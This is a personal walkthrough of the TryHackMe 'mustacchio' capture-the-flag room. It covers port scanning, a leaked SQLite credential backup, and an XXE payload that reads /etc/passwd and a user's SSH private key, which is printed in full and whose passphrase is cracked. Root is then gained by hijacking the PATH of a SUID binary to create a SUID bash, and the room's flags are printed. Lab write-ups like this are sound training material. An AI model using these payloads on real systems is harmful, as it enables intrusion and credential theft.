# Tryhackme.com Room : mustacchio

`https://tryhackme.com/room/mustacchio`

## Instance

```bash
export IP="10.10.93.236"
```

## Nmap

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Initial foothold

Looking at the website on port `80`, we see only static files. Not much there.

The `robots.txt` file contains :

```
User-agent: *
Disallow: /
```

Again not much use here.



Let's gobuster the website.

We find the `/custom` folder. In `/custom/js` we find `user.bak`

Running `file` on `user.bak` we see that it's a `sqlite` database

```
users.bak: SQLite 3.x database, last written using SQLite version 3034001
```

Opening the sqlite database we see that there is only 1 table `user` with :

```
admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Looking on `crackstation` we find that the hash correspond to :

```
admin:bulldog19
```

Tried to login via `ssh` with those credentials but it doesn't work. We need an `ssh key`.

Hmmmm, not sure where we can use these credentials.

Gobuster didn't return other usefull stuff so far.

I was running in circle a bit so I decided to have a quick look at a writeup.

Seems like I missed an open port : `8765`

I did run an all port scan with `nmap --min-rate 4500 --max-rtt-timeout 1500ms -p- -v -oN nmap.all_ports 10.10.93.236` but it didn't catch it



We do however find the port using `nmap -p- -v 10.10.93.236 -T5` but the scan is kinda slow...



Browsing `:8765` we are greeted with a login page. We can login using the `admin:bulldog19` credentials.

We are now greeted by a php page with the prompt `Add a comment on the website` and a textarea with a submit button.



Looking at the source code we find some interesting stuff :

```
<!-- Barry, you can now SSH in using your key!-->
```

So, seems like we got to find an `ssh key` and login as `barry`

We also see 

```
//document.cookie = "Example=/auth/dontforget.bak"; 
```

This is actually an `xml` payload :

```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

When we submit this `xml` in the form, we get a preview of the comment.



This might be a `XXE vulnerability (XML external entity injection)`

We can simply add this to the payload :

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Here is the full payload :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <name>Pwned</name>
  <author>Pwned</author>
  <com>&xxe;</com>
</comment>
```

And we get the content of `/etc/passwd` :

```
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```

Let's try to retrieve some `ssh keys` :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Pwned</name>
  <author>Pwned</author>
  <com>&xxe;</com>
</comment>
```

And we do get it :

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

The key require a passphrase. Let's try to crackit with `john the ripper`.

First we need to prepare the key with `/usr/share/john/ssh2john.py barry.key > barry.key.for_john` and then we run `john --wordlist=/usr/share/wordlists/rockyou.txt barry.key.for_john`.

We find the passphrase :

```
urieljames
```



Now let's login via ssh.

We find `/home/barry/user.txt` :

```
62d77a4d5f97d47c5aa38b3b2651b831
```



## Priv esc

We take a look at `/home/joe` and we find the `live_log` executable.

We run it and it simply show the http logs.

Running `strings live_log` we find that it simply call `system` with the argument :

```
tail -f /var/log/nginx/access.log
```

The executable has a `suid` bit set.

We can probably highjack the `tail` binary since it's a relative path and get code execution as `joe`.

Let's do this.

We create a small shell script in `/tmp/bin/tail` :

```
#!/bin/bash
id > /tmp/pwn
```

We then add it to the `PATH` with `export PATH=/tmp/bin:$PATH`.

We run `/home/joe/live_log` and the `/tmp/pwn` file is indeed created.

But it's runned as `root` ! I thought that `live_log` was owned by `joe` but it is in fact owned by `root` so yeah... even better :P 



Let's modify our `tail` script :

```
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

We then run `/tmp/bash -p` and we are `root` !



Let's get the flag in `/root/root.txt` :

```
3223581420d906c4dd1a5f9b530393a5
```



And it's done !



## Wrap up

* This was a pretty easy box
* I did get bite in the ass by the fact that I wasn't patient enough to scan all ports... Should always do a full port scan, even if it's slow...
* Looking at a write up, I could have just spawned a shell by calling `/bin/bash` in my `tail` script instead of copying `bash` and setting the `suid` bit.

